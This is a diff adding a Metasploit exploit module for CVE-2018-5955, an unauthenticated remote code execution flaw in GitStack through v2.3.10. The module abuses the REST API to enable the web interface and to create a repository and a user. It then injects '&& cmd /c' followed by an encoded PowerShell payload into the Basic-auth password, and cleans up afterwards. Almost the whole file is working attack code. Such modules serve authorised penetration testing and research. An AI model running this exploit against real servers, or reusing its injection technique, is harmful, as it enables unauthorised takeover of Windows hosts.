@@ -1,0 +1,301 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = GreatRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Powershell
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'GitStack Unsanitized Argument RCE',
+      'Description'    => %q{
+        This module exploits a remote code execution vulnerability that
+        exists in GitStack through v2.3.10, caused by an unsanitized argument
+        being passed to an exec function call. This module has been tested
+        on GitStack v2.3.10.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Kacper Szurek',    # Vulnerability discovery and PoC
+          'Jacob Robles'      # Metasploit module
+        ],
+      'References'     =>
+        [
+          ['CVE', '2018-5955'],
+          ['EDB', '43777'],
+          ['EDB', '44044'],
+          ['URL', 'https://security.szurek.pl/gitstack-2310-unauthenticated-rce.html']
+        ],
+      'DefaultOptions' =>
+        {
+          'EXITFUNC' => 'thread'
+        },
+      'Platform'       => 'win',
+      'Targets'        => [['Automatic', {}]],
+      'Privileged'     => true,
+      'DisclosureDate' => 'Jan 15 2018',
+      'DefaultTarget'  => 0))
+  end
+
+  def check_web
+    begin
+      res = send_request_cgi({
+        'uri'     =>  '/rest/settings/general/webinterface/',
+        'method'  => 'GET'
+      })
+    rescue Rex::ConnectionError, Errno::ECONNRESET => e
+      print_error("Failed: #{e.class} - #{e.message}")
+    end
+
+    if res && res.code == 200
+      if res.body =~ /true/
+        vprint_good('Web interface is enabled')
+        return true
+      else
+        vprint_error('Web interface is disabled')
+        return false
+      end
+    else
+      print_error('Unable to determine status of web interface')
+      return nil
+    end
+  end
+
+  def check_repos
+    begin
+      res = send_request_cgi({
+        'uri'     =>  '/rest/repository/',
+        'method'  =>  'GET',
+      })
+    rescue Rex::ConnectionError, Errno::ECONNRESET => e
+      print_error("Failed: #{e.class} - #{e.message}")
+    end
+    if res && res.code == 200
+      begin
+        mylist = res.get_json_document
+      rescue JSON::ParserError => e
+        print_error("Failed: #{e.class} - #{e.message}")
+        return nil
+      end
+
+      if mylist.length == 0
+        vprint_error('No repositories found')
+        return false
+      else
+        vprint_good('Repositories found')
+        return mylist
+      end
+    else
+      print_error('Unable to determine available repositories')
+      return nil
+    end
+  end
+
+  def update_web(web)
+    data = {'enabled' => web}
+    begin
+      res = send_request_cgi({
+        'uri'     =>  '/rest/settings/general/webinterface/',
+        'method'  =>  'PUT',
+        'data'    =>  data.to_json
+      })
+    rescue Rex::ConnectionError, Errno::ECONNRESET => e
+      print_error("Failed: #{e.class} - #{e.message}")
+    end
+    if res && res.code == 200
+      vprint_good("#{res.body}")
+    end
+  end
+
+  def create_repo
+    repo = Rex::Text.rand_text_alpha(5)
+    c_token = Rex::Text.rand_text_alpha(5)
+    begin
+      res = send_request_cgi({
+        'uri'       =>  '/rest/repository/',
+        'method'    =>  'POST',
+        'cookie'    =>  "csrftoken=#{c_token}",
+        'vars_post' =>  {
+          'name'                =>  repo,
+          'csrfmiddlewaretoken' =>  c_token
+        }
+      })
+    rescue Rex::ConnectionError, Errno::ECONNRESET => e
+      print_error("Failed: #{e.class} - #{e.message}")
+    end
+    if res && res.code == 200
+      vprint_good("#{res.body}")
+      return repo
+    else
+      print_status('Unable to create repository')
+      return nil
+    end
+  end
+
+  def delete_repo(repo)
+    begin
+      res = send_request_cgi({
+        'uri'     =>  "/rest/repository/#{repo}/",
+        'method'  =>  'DELETE'
+      })
+    rescue Rex::ConnectionError, Errno::ECONNRESET => e
+      print_error("Failed: #{e.class} - #{e.message}")
+    end
+
+    if res && res.code == 200
+      vprint_good("#{res.body}")
+    else
+      print_status('Failed to delete repository')
+    end
+  end
+
+  def create_user
+    user = Rex::Text.rand_text_alpha(5)
+    pass = user
+    begin
+      res = send_request_cgi({
+        'uri'       => '/rest/user/',
+        'method'    =>  'POST',
+        'vars_post' =>  {
+          'username'  =>  user,
+          'password'  =>  pass
+        }
+      })
+    rescue Rex::ConnectionError, Errno::ECONNRESET => e
+      print_error("Failed: #{e.class} - #{e.message}")
+    end
+    if res && res.code == 200
+      vprint_good("Created user: #{user}")
+      return user
+    else
+      print_error("Failed to create user")
+      return nil
+    end
+  end
+
+  def delete_user(user)
+    begin
+      res = send_request_cgi({
+        'uri'     =>  "/rest/user/#{user}/",
+        'method'  =>  'DELETE'
+      })
+    rescue Rex::ConnectionError, Errno::ECONNRESET => e
+      print_error("Failed: #{e.class} - #{e.message}")
+    end
+    if res && res.code == 200
+      vprint_good("#{res.body}")
+    else
+      print_status('Delete user unsuccessful')
+    end
+  end
+
+  def mod_user(repo, user, method)
+    begin
+      res = send_request_cgi({
+        'uri'     =>  "/rest/repository/#{repo}/user/#{user}/",
+        'method'  =>  method
+      })
+    rescue Rex::ConnectionError, Errno::ECONNRESET => e
+      print_error("Failed: #{e.class} - #{e.message}")
+    end
+    if res && res.code == 200
+      vprint_good("#{res.body}")
+    else
+      print_status('Unable to add/remove user from repo')
+    end
+  end
+
+  def repo_users(repo)
+    begin
+      res = send_request_cgi({
+        'uri'     =>  "/rest/repository/#{repo}/user/",
+        'method'  =>  'GET'
+      })
+    rescue Rex::ConnectionError, Errno::ECONNRESET => e
+      print_error("Failed: #{e.class} - #{e.message}")
+    end
+    if res && res.code == 200
+      begin
+        users = res.get_json_document
+        users -= ['everyone']
+      rescue JSON::ParserError => e
+        print_error("Failed: #{e.class} - #{e.message}")
+        users = nil
+      end
+    else
+      return nil
+    end
+    return users
+  end
+
+  def run_exploit(repo, user, cmd)
+    begin
+      res = send_request_cgi({
+        'uri'           =>  '/web/index.php',
+        'method'        =>  'GET',
+        'authorization' =>  basic_auth(user, "#{Rex::Text.rand_text_alpha(1)} && cmd /c #{cmd}"),
+        'vars_get'      =>  {
+          'p' =>  "#{repo}.git",
+          'a' =>  'summary'
+        }
+      })
+    rescue Rex::ConnectionError, Errno::ECONNRESET => e
+      print_error("Failed: #{e.class} - #{e.message}")
+    end
+  end
+
+  def exploit
+    command = cmd_psh_payload(
+      payload.encoded,
+      payload_instance.arch.first,
+      { :remove_comspec => true, :encode_final_payload => true }
+    )
+    fail_with(Failure::PayloadFailed, "Payload exceeds space left in exec call") if command.length > 6110
+
+    web = check_web
+    repos = check_repos
+
+    if web.nil? || repos.nil?
+      return
+    end
+
+    unless web
+      update_web(!web)
+      # Wait for interface
+      sleep 8
+    end
+
+    if repos
+      pwn_repo = repos[0]['name']
+    else
+      pwn_repo = create_repo
+    end
+
+    r_users = repo_users(pwn_repo)
+    if r_users.present?
+      pwn_user = r_users[0]
+      run_exploit(pwn_repo, pwn_user, command)
+    else
+      pwn_user = create_user
+      if pwn_user
+        mod_user(pwn_repo, pwn_user, 'POST')
+        run_exploit(pwn_repo, pwn_user, command)
+        mod_user(pwn_repo, pwn_user, 'DELETE')
+        delete_user(pwn_user)
+      end
+    end
+
+    unless web
+      update_web(web)
+    end
+
+    unless repos
+      delete_repo(pwn_repo)
+    end
+  end
+end
